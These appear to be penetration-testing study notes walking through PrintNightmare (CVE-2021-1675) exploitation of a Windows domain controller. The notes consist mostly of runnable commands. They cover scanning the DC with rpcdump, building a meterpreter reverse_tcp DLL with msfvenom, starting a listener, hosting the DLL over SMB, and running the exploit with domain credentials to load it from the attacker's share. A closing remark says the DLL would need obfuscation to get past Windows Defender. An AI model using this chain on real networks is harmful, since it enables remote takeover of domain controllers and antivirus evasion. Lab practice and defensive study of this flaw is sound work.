This is a post compromise attack. We need at least a user account.

cube0x0 RCE - https://github.com/cube0x0/CVE-2021-1675

calebstewart LPE - https://github.com/calebstewart/CVE-2021-1675

---

# Scan for vulnerable hosts

Let's scan our DC to see if its vulnerable:
```bash
rpcdump.py @10.0.0.18 | egrep 'MS-RPRN|MS-PAR'
```

Looks like the DC is potentially vulnerable:
![[Pasted image 20240324195546.png]]

# Exploitation

As per the github page this needs the newest impacket version.
In order to get back to the version 0.9 you can use pimpmykali.
=> Probably works with virtual env aswell

1. use msfvenom to create a reverse_tcp DLL
2. host the DLL
3. Run the exploit

Create a reverse_tcp DLL with msfvenom:
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -f dll > shell.dll
```

Create listener:
```msfconsole
use multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set lport <port>
run
```

Host the DLL:
```bash
smbserver.py <share-name> <dir> -smb2support
smbserver.py share `pwd` -smb2support
```

Run exploit:
```bash
python3 CVE-2021-1675.py <AD-FQDN>/<domain-user>:<password>@<dc-ip> '\\<attacker-ip>\share\shell.dll'
```

>[!Note] Windows Defender
>Windows Defender blocks the DLL created with msfvenom. In a real engagement we would need to obfuscate the DLL.